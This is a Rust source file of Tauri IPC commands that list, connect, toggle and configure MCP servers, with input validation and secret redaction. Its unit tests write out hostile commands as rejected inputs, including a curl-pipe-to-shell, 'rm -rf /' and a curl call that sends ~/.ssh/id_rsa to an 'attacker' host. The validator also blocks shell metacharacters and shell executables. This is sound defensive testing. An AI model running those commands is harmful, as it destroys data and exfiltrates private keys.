//! Tauri IPC commands for MCP server management.

use crate::tauri::error::IpcError;
use crate::tauri::state::TauriState;
use echo_agent_app_core::types::McpTransportConfig;

#[tauri::command]
pub async fn list_mcp_servers(
    state: tauri::State<'_, TauriState>,
) -> Result<serde_json::Value, IpcError> {
    let mcp_config = state.app_state.plugins.mcp_config.read().await;
    let mcp_health = state.app_state.plugins.mcp_health.read().await;

    let servers: Vec<serde_json::Value> = state
        .app_state
        .connection
        .agent
        .read(|agent| {
            let connected_names: Vec<String> = agent
                .list_mcp_servers()
                .into_iter()
                .map(|s| s.to_string())
                .collect();

            let mut result: Vec<serde_json::Value> = Vec::new();

            // 1. Connected servers (from agent)
            for name in &connected_names {
                let health_entry = mcp_health.get(name.as_str());
                let status = if let Some(h) = health_entry.as_ref() {
                    if h.healthy { "connected" } else { "error" }
                } else {
                    "disconnected"
                };
                let transport = mcp_config
                    .mcp_servers
                    .get(name.as_str())
                    .map(|e| infer_transport(e))
                    .unwrap_or("stdio");
                let error = health_entry.as_ref().and_then(|h| h.error.clone());

                // Get actual tools from the MCP client
                let (tools, tool_count) = if let Some(client) = agent.mcp_client(name) {
                    let mcp_tools = client.tools();
                    let count = mcp_tools.len();
                    let tools: Vec<serde_json::Value> = mcp_tools
                        .iter()
                        .map(|t| {
                            serde_json::json!({
                                "name": t.name,
                                "description": t.description.as_deref().unwrap_or(""),
                            })
                        })
                        .collect();
                    (tools, count)
                } else {
                    (vec![], 0)
                };

                result.push(serde_json::json!({
                    "name": name,
                    "status": status,
                    "transport": transport,
                    "tool_count": tool_count,
                    "tools": tools,
                    "connected_at": null,
                    "error": error,
                    "enabled": true,
                }));
            }

            // 2. Configured but not connected servers (disabled or not yet connected)
            for (config_name, entry) in &mcp_config.mcp_servers {
                if !connected_names.contains(config_name) {
                    let transport = infer_transport(entry);
                    result.push(serde_json::json!({
                        "name": config_name,
                        "status": if entry.disabled { "disabled" } else { "disconnected" },
                        "transport": transport,
                        "tool_count": 0,
                        "tools": [],
                        "connected_at": null,
                        "error": null,
                        "enabled": !entry.disabled,
                    }));
                }
            }

            result
        })
        .await;

    Ok(serde_json::json!(servers))
}

fn infer_transport(entry: &echo_agent::mcp::McpServerEntry) -> &'static str {
    if entry.url.is_some() {
        if entry.transport.as_deref() == Some("sse") {
            "sse"
        } else {
            "http"
        }
    } else if entry.command.is_some() {
        "stdio"
    } else {
        "unknown"
    }
}

/// Validate the shape of a user-configured MCP stdio command.
///
/// EKO is a local desktop assistant, so an interactive MCP connection is not
/// governed by the agent's automatic-execution permissions. Keep only input
/// validation that catches accidental shell composition or traversal.
fn validate_ipc_mcp_stdio(command: &str) -> Result<String, IpcError> {
    let tokens = shell_words::split(command)
        .map_err(|error| IpcError::Validation(format!("invalid MCP stdio command: {error}")))?;
    if tokens.is_empty() {
        return Err(IpcError::Validation(
            "MCP stdio command is empty".to_string(),
        ));
    }
    if command.contains("..") {
        return Err(IpcError::Validation(
            "MCP stdio command contains path traversal ('..')".to_string(),
        ));
    }
    if command.contains([';', '|', '&', '`', '$', '(', ')', '<', '>']) {
        return Err(IpcError::Validation(
            "MCP stdio command contains shell metacharacters".to_string(),
        ));
    }
    let executable = tokens
        .first()
        .and_then(|value| std::path::Path::new(value).file_name())
        .and_then(|value| value.to_str())
        .unwrap_or_default();
    let is_shell = matches!(
        executable.to_ascii_lowercase().as_str(),
        "sh" | "bash" | "zsh" | "fish" | "dash" | "ksh" | "pwsh" | "powershell"
    );
    if is_shell && tokens.iter().skip(1).any(|value| value == "-c") {
        return Err(IpcError::Validation(
            "MCP stdio executable must not wrap a composed shell command".to_string(),
        ));
    }
    Ok(command.to_string())
}

/// Validate an IPC-supplied MCP HTTP/SSE URL.
///
/// HTTPS is required for remote hosts. Plain HTTP remains valid for loopback
/// MCP servers, which are a normal local-extension workflow.
fn validate_ipc_mcp_url(url: &str) -> Result<String, IpcError> {
    let (scheme, remainder) = url.split_once("://").ok_or_else(|| {
        IpcError::Validation("MCP URL must include an http or https scheme".to_string())
    })?;
    let authority = remainder
        .split(['/', '?', '#'])
        .next()
        .filter(|value| !value.is_empty())
        .ok_or_else(|| IpcError::Validation("MCP URL has no host".to_string()))?;
    let host_port = authority.rsplit('@').next().unwrap_or(authority);
    let host = if let Some(ipv6) = host_port.strip_prefix('[') {
        ipv6.split_once(']').map(|(host, _)| host).unwrap_or(ipv6)
    } else {
        host_port
            .rsplit_once(':')
            .map(|(host, _)| host)
            .unwrap_or(host_port)
    };
    let is_loopback = host.eq_ignore_ascii_case("localhost")
        || host
            .parse::<std::net::IpAddr>()
            .is_ok_and(|ip| ip.is_loopback());
    if scheme != "https" && !(scheme == "http" && is_loopback) {
        return Err(IpcError::Validation(format!(
            "MCP URL must use https, except loopback servers may use http (got: '{url}')"
        )));
    }
    Ok(url.to_string())
}

#[tauri::command]
pub async fn connect_mcp_server(
    state: tauri::State<'_, TauriState>,
    name: String,
    transport: McpTransportConfig,
) -> Result<serde_json::Value, IpcError> {
    use echo_agent::mcp::McpServerConfig;
    // MCP is a user-driven capability extension: the user explicitly configures
    // servers they trust. EKO is a local personal assistant with no online /
    // multi-user threat model, so we don't gate it behind a permission mode.
    // Input validation (executable allowlist + URL scheme) below still guards
    // against typos and obvious misconfiguration.

    // P0-2 / N-P0-4: validate before spawning. The frontend must not be able
    // to spawn an arbitrary process or POST to an arbitrary internal URL.
    let config = match transport {
        McpTransportConfig::Stdio { command, args, env } => {
            let validated_cmd = validate_ipc_mcp_stdio(&command)?;
            let env_pairs: Vec<(String, String)> = env.into_iter().collect();
            McpServerConfig::stdio_with_env(&name, &validated_cmd, args, env_pairs)
        }
        McpTransportConfig::Http { url, headers } => {
            let validated_url = validate_ipc_mcp_url(&url)?;
            McpServerConfig::http_with_headers(&name, &validated_url, headers)
        }
        McpTransportConfig::Sse { url, headers } => {
            let validated_url = validate_ipc_mcp_url(&url)?;
            McpServerConfig::sse_with_headers(&name, &validated_url, headers)
        }
    };

    let connect_result = state
        .app_state
        .connection
        .agent
        .write_async(|agent| {
            let config = config.clone();
            Box::pin(async move { agent.connect_mcp_from_config(config).await })
        })
        .await;

    match connect_result {
        Ok(_) => Ok(serde_json::json!({"success": true, "name": name})),
        Err(e) => Ok(serde_json::json!({
            "success": false,
            "error": format!("Failed to connect to MCP server '{}': {}", name, e),
        })),
    }
}

#[tauri::command]
pub async fn disconnect_mcp_server(
    state: tauri::State<'_, TauriState>,
    name: String,
) -> Result<serde_json::Value, IpcError> {
    state
        .app_state
        .connection
        .agent
        .write_async(|agent| {
            let name = name.clone();
            Box::pin(async move {
                agent.disconnect_mcp(&name).await;
            })
        })
        .await;

    {
        let mut health = state.app_state.plugins.mcp_health.write().await;
        health.remove(&name);
    }

    Ok(serde_json::json!({
        "success": true,
        "message": format!("Disconnected from MCP server '{}'", name),
    }))
}

/// Toggle MCP server enabled/disabled — takes effect immediately.
///
/// When `enabled = true`: connects the server (if configured in mcp_config).
/// When `enabled = false`: disconnects the server and marks it as disabled in config.
#[tauri::command]
pub async fn toggle_mcp_server(
    state: tauri::State<'_, TauriState>,
    name: String,
    enabled: bool,
) -> Result<serde_json::Value, IpcError> {
    // Update the disabled flag in config
    {
        let mut cfg = state.app_state.plugins.mcp_config.write().await;
        if let Some(entry) = cfg.mcp_servers.get_mut(&name) {
            entry.disabled = !enabled;
        } else if enabled {
            return Err(IpcError::NotFound(format!(
                "MCP server '{}' not found in config",
                name
            )));
        }
    }

    if enabled {
        // Connect: get the server config and connect via agent
        let server_config = {
            let cfg = state.app_state.plugins.mcp_config.read().await;
            cfg.mcp_servers
                .get(&name)
                .and_then(|e| e.to_server_config(&name).ok())
        };

        if let Some(config) = server_config {
            let result = state
                .app_state
                .connection
                .agent
                .write_async(|agent| {
                    Box::pin(async move { agent.connect_mcp_from_config(config).await })
                })
                .await;

            match result {
                Ok(_) => Ok(serde_json::json!({
                    "success": true,
                    "enabled": true,
                    "message": format!("MCP server '{}' enabled and connected", name),
                })),
                Err(e) => Ok(serde_json::json!({
                    "success": true,
                    "enabled": true,
                    "message": format!("MCP server '{}' enabled but connection failed: {}", name, e),
                })),
            }
        } else {
            Ok(serde_json::json!({
                "success": true,
                "enabled": true,
                "message": format!("MCP server '{}' enabled (no config to connect)", name),
            }))
        }
    } else {
        // Disconnect: remove from agent and health
        state
            .app_state
            .connection
            .agent
            .write_async(|agent| {
                let name = name.clone();
                Box::pin(async move {
                    agent.disconnect_mcp(&name).await;
                })
            })
            .await;

        {
            let mut health = state.app_state.plugins.mcp_health.write().await;
            health.remove(&name);
        }

        Ok(serde_json::json!({
            "success": true,
            "enabled": false,
            "message": format!("MCP server '{}' disabled and disconnected", name),
        }))
    }
}

#[tauri::command]
pub async fn get_mcp_config(
    state: tauri::State<'_, TauriState>,
) -> Result<serde_json::Value, IpcError> {
    let config = state.app_state.plugins.mcp_config.read().await;
    let mut value =
        serde_json::to_value(&*config).map_err(|e| IpcError::Internal(e.to_string()))?;
    // P1-3: redact secrets before returning to the frontend. MCP `env` and
    // `headers` routinely carry API tokens (e.g. `Authorization: Bearer …`,
    // `API_KEY=sk-…`); returning them verbatim means any page (or XSS) can
    // exfiltrate every server's credentials via a single `invoke`. Replace
    // each value with a presence marker so the UI can still show "configured".
    redact_mcp_config_secrets(&mut value);
    Ok(value)
}

/// Replace credential-bearing values in a serialized MCP config with
/// `"<redacted>"` markers (P1-3). Mutates in place.
///
/// - `env` map values → `"<redacted>"` (env vars for stdio servers are almost
///   always secrets).
/// - `headers` map values → `"<redact>"` redaction of the credential part
///   (keeps the scheme, e.g. `Bearer <redacted>`, so the UI can show the auth
///   type without exposing the token).
/// - `url` query params named like secrets (`token`/`key`/`secret`/`password`)
///   → value `<redacted>`.
fn redact_mcp_config_secrets(value: &mut serde_json::Value) {
    let Some(servers) = value.get_mut("mcpServers").and_then(|v| v.as_object_mut()) else {
        return;
    };
    for (_name, entry) in servers.iter_mut() {
        let Some(obj) = entry.as_object_mut() else {
            continue;
        };
        if let Some(env) = obj.get_mut("env").and_then(|v| v.as_object_mut()) {
            for (_k, v) in env.iter_mut() {
                *v = serde_json::Value::String("<redacted>".to_string());
            }
        }
        if let Some(headers) = obj.get_mut("headers").and_then(|v| v.as_object_mut()) {
            for (_k, v) in headers.iter_mut() {
                if let Some(s) = v.as_str().map(|s| s.to_string()) {
                    *v = serde_json::Value::String(redact_header_value(&s));
                }
            }
        }
        if let Some(url) = obj
            .get_mut("url")
            .and_then(|v| v.as_str())
            .map(|s| s.to_string())
            && let Some(redacted) = redact_url_secrets(&url)
        {
            obj.insert("url".to_string(), serde_json::Value::String(redacted));
        }
    }
}

/// Redact the credential portion of a header value, keeping the scheme.
/// `Bearer sk-abc` → `Bearer <redacted>`; unknown schemes → `<redacted>`.
fn redact_header_value(value: &str) -> String {
    if let Some((scheme, _)) = value.split_once(' ') {
        format!("{scheme} <redacted>")
    } else {
        "<redacted>".to_string()
    }
}

/// If `url` has a query parameter whose name looks like a secret
/// (`token`/`key`/`secret`/`password`/`apikey`), return the URL with those
/// values replaced by `<redacted>`. Returns `None` if nothing to redact.
fn redact_url_secrets(url: &str) -> Option<String> {
    let (base, query) = url.split_once('?')?;
    let secret_names = [
        "token",
        "key",
        "secret",
        "password",
        "apikey",
        "access_token",
    ];
    let mut changed = false;
    let parts: Vec<String> = query
        .split('&')
        .map(|kv| {
            let (k, _v) = kv.split_once('=').unwrap_or((kv, ""));
            if secret_names.iter().any(|s| k.eq_ignore_ascii_case(s)) {
                changed = true;
                format!("{k}=<redacted>")
            } else {
                kv.to_string()
            }
        })
        .collect();
    if changed {
        Some(format!("{}?{}", base, parts.join("&")))
    } else {
        None
    }
}

#[tauri::command]
pub async fn update_mcp_config(
    state: tauri::State<'_, TauriState>,
    config: serde_json::Value,
) -> Result<serde_json::Value, IpcError> {
    let new_config: echo_agent::mcp::McpConfigFile =
        serde_json::from_value(config).map_err(|e| IpcError::Validation(e.to_string()))?;

    // 1. Persist the new config synchronously and return success immediately.
    //    Reconnection is potentially slow (stdio spawn / HTTP / SSE with their
    //    own timeouts) and must NOT block the IPC response — otherwise the
    //    frontend's "保存中..." spinner spins forever when a server is
    //    unreachable. We reconcile connections in a background task below.
    {
        let mut cfg = state.app_state.plugins.mcp_config.write().await;
        *cfg = new_config.clone();
    }

    let agent_handle = state.app_state.connection.primary_agent();

    // 2. Reconnect in the background. Each server connection is bounded by a
    //    timeout so one unreachable server (e.g. an `http://localhost:8100`
    //    that nothing is serving) can't stall the whole reconnect loop for
    //    tens of seconds. connect_mcp_from_config / disconnect_mcp require
    //    `&mut self`, so this runs inside write_async (holds the write lock).
    //    That's acceptable now because no IPC caller is waiting on it.
    tokio::spawn(async move {
        const CONNECT_TIMEOUT: std::time::Duration = std::time::Duration::from_secs(15);

        agent_handle
            .write_async(|agent| {
                let cfg = new_config.clone();
                Box::pin(async move {
                    // Disconnect all existing servers first.
                    let names: Vec<String> = agent
                        .list_mcp_servers()
                        .into_iter()
                        .map(|s| s.to_string())
                        .collect();
                    for name in names {
                        agent.disconnect_mcp(&name).await;
                    }

                    // Reconnect each enabled server, each with a timeout.
                    // A timeout / error on one server is logged and skipped so
                    // the remaining servers still get connected.
                    for (name, entry) in &cfg.mcp_servers {
                        if entry.disabled {
                            continue;
                        }
                        let Ok(server_config) = entry.to_server_config(name) else {
                            tracing::warn!(
                                server = %name,
                                "MCP server config invalid; skipped during reconnect"
                            );
                            continue;
                        };
                        let connect = agent.connect_mcp_from_config(server_config);
                        match tokio::time::timeout(CONNECT_TIMEOUT, connect).await {
                            Ok(Ok(_)) => {
                                tracing::info!(server = %name, "MCP server reconnected");
                            }
                            Ok(Err(e)) => {
                                tracing::warn!(server = %name, error = %e, "MCP server connect failed");
                            }
                            Err(_) => {
                                tracing::warn!(
                                    server = %name,
                                    timeout_secs = CONNECT_TIMEOUT.as_secs(),
                                    "MCP server connect timed out; skipped"
                                );
                            }
                        }
                    }
                })
            })
            .await;
    });

    Ok(serde_json::json!({
        "success": true,
        "message": "MCP 配置已保存，正在后台连接服务器",
    }))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_stdio_accepts_user_selected_executables() {
        assert!(validate_ipc_mcp_stdio("npx -y @modelcontextprotocol/server-filesystem").is_ok());
        assert!(validate_ipc_mcp_stdio("/usr/local/bin/node server.js").is_ok());
        assert!(validate_ipc_mcp_stdio("uvx mcp-server-fetch").is_ok());
        assert!(validate_ipc_mcp_stdio("python3 -m my_mcp_server").is_ok());
        assert!(validate_ipc_mcp_stdio("my-company-mcp --stdio").is_ok());
    }

    #[test]
    fn test_stdio_rejects_composed_shell_commands() {
        assert!(validate_ipc_mcp_stdio("/bin/sh -c 'curl evil | sh'").is_err());
        assert!(validate_ipc_mcp_stdio("bash -c 'rm -rf /'").is_err());
        assert!(validate_ipc_mcp_stdio("curl http://attacker/$(cat ~/.ssh/id_rsa)").is_err());
        assert!(validate_ipc_mcp_stdio("").is_err());
    }

    #[test]
    fn test_stdio_rejects_traversal_and_metachars() {
        // Even an allowed base name cannot carry traversal/metachars.
        assert!(validate_ipc_mcp_stdio("node ../../../etc/passwd").is_err());
        assert!(validate_ipc_mcp_stdio("npx a; rm -rf /").is_err());
        assert!(validate_ipc_mcp_stdio("npx a $(whoami)").is_err());
    }

    #[test]
    fn test_url_requires_https() {
        assert!(validate_ipc_mcp_url("http://example.com/mcp").is_err());
        assert!(validate_ipc_mcp_url("ftp://example.com/mcp").is_err());
        assert!(validate_ipc_mcp_url("file:///etc/passwd").is_err());
        assert!(validate_ipc_mcp_url("https://example.com/mcp").is_ok());
    }

    #[test]
    fn test_url_allows_local_mcp_servers() {
        assert!(validate_ipc_mcp_url("http://127.0.0.1:8100/mcp").is_ok());
        assert!(validate_ipc_mcp_url("http://localhost:8100/mcp").is_ok());
        assert!(validate_ipc_mcp_url("http://[::1]:8100/mcp").is_ok());
        assert!(validate_ipc_mcp_url("https://192.168.1.1/mcp").is_ok());
    }

    #[test]
    fn test_url_allows_public_https() {
        assert!(validate_ipc_mcp_url("https://api.example.com/v1/mcp").is_ok());
        assert!(validate_ipc_mcp_url("https://mcp.anthropic.com/sse").is_ok());
    }
}
